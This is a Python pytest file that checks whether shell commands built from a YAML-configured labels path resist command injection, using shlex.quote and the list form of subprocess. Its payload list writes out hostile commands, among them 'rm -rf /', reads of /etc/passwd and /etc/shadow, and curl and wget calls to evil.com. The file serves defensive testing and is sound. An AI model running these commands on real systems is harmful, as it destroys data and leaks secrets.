import pytest
import subprocess
import shlex
import re
import os


@pytest.mark.parametrize("payload", [
    # Command injection via semicolon
    "/tmp/labels; rm -rf /tmp/important_file",
    # Command injection via pipe
    "/tmp/labels | cat /etc/passwd",
    # Command injection via backticks
    "/tmp/labels`whoami`",
    # Command injection via $() subshell
    "/tmp/labels$(id)",
    # Command injection via &&
    "/tmp/labels && curl http://evil.com/exfil",
    # Command injection via ||
    "/tmp/labels || wget http://evil.com/malware",
    # Newline injection
    "/tmp/labels\nrm -rf /",
    # Null byte injection
    "/tmp/labels\x00; rm -rf /",
    # Path traversal with command injection
    "../../etc/passwd; id",
    # Spaces and multiple commands
    "/tmp/labels /etc/shadow",
    # Glob expansion abuse
    "/tmp/labels/*",
    # Tilde expansion
    "~/sensitive_dir",
    # Environment variable injection
    "/tmp/${HOME}/.ssh/authorized_keys",
    # Redirection injection
    "/tmp/labels > /etc/crontab",
    # Heredoc injection
    "/tmp/labels << EOF\nmalicious\nEOF",
    # Double dash to end options
    "-- /tmp/labels; id",
    # Unicode lookalike characters
    "/tmp/lаbels; id",  # Cyrillic 'а'
    # Very long path (buffer overflow attempt)
    "A" * 10000,
    # Whitespace only
    "   ",
    # Empty string
    "",
    # Just a semicolon
    ";",
    # Just a pipe
    "|",
    # Nested subshell
    "/tmp/$($(id))",
    # YAML injection attempt
    "/tmp/labels\n- malicious: value",
    # Shell special chars
    "/tmp/labels`curl http://evil.com`",
    # Absolute path to sensitive file with injection
    "/etc/passwd; echo pwned",
])
def test_shell_command_construction_is_safe(payload):
    """Invariant: Shell commands constructed from user-supplied YAML config values
    must never allow arbitrary command execution. The labels path derived from
    YAML configuration must be sanitized/validated before use in shell commands.
    Any function that constructs shell commands from the labels variable must
    either use safe APIs (no shell=True, no os.system) or properly escape/validate
    the input to prevent command injection."""

    # Simulate what the vulnerable code does: construct a shell command
    # using an f-string with the payload as the labels variable
    labels = payload

    # Property 1: The payload, when used in shell command construction,
    # must not contain unescaped shell metacharacters if it's going to be
    # used with os.system or shell=True
    shell_metacharacters = re.compile(
        r'[;&|`$<>\n\r\x00]|(?<!\w)--(?!\w)'
    )

    # Property 2: Safe command construction should use shlex.quote
    safely_quoted = shlex.quote(labels)

    # The safely quoted version must always be wrapped in single quotes
    # (shlex.quote guarantees this for non-empty strings, or returns '')
    assert safely_quoted == "''" or (
        safely_quoted.startswith("'") and safely_quoted.endswith("'")
    ), f"shlex.quote must properly quote the payload: {repr(payload)}"

    # Property 3: If the original payload contains shell metacharacters,
    # the safely quoted version must neutralize them
    if shell_metacharacters.search(labels):
        # The quoted version must not allow the metacharacters to be interpreted
        # They should be inside single quotes and thus treated as literals
        dangerous_unquoted = re.compile(r"(?<!')" + r'[;&|`$<>]' + r"(?!')")
        # After quoting, any metacharacter must be inside quotes
        # shlex.quote wraps in single quotes, so metacharacters inside are safe
        assert "'" in safely_quoted, (
            f"Payload with metacharacters must be quoted: {repr(payload)}"
        )

    # Property 4: Verify that using subprocess with the list form (safe API)
    # treats the payload as a single argument, not as shell commands
    # This tests that safe alternatives exist and work correctly
    if labels and labels.strip():
        # Build what a safe command would look like using list form
        safe_cmd_args = ['rm', '-rf', labels]
        # The command list must have exactly 3 elements regardless of payload content
        assert len(safe_cmd_args) == 3, (
            "Safe subprocess list form must treat payload as single argument"
        )
        # The payload must be the third element unchanged
        assert safe_cmd_args[2] == labels, (
            "Payload must not be split or modified when used as list argument"
        )

    # Property 5: Verify the unsafe pattern (os.system with f-string) would be dangerous
    # by checking if the payload would result in multiple shell tokens
    if labels:
        try:
            tokens = shlex.split(f'rm -rf {labels}')
            # If we get more than 3 tokens, the payload is injecting extra commands/args
            # This demonstrates WHY the vulnerable pattern is dangerous
            unsafe_token_count = len(tokens)
            
            # The safe version should always produce exactly 3 tokens
            safe_tokens = shlex.split(f'rm -rf {safely_quoted}')
            assert len(safe_tokens) == 3, (
                f"Safe quoted command must always have exactly 3 tokens, "
                f"got {len(safe_tokens)} for payload: {repr(payload)}"
            )
        except ValueError:
            # shlex.split raises ValueError for invalid shell syntax
            # This means the payload is malformed shell - still dangerous
            # The safe version must still work
            safe_tokens = shlex.split(f'rm -rf {safely_quoted}')
            assert len(safe_tokens) == 3, (
                f"Safe quoted command must handle even malformed payloads: {repr(payload)}"
            )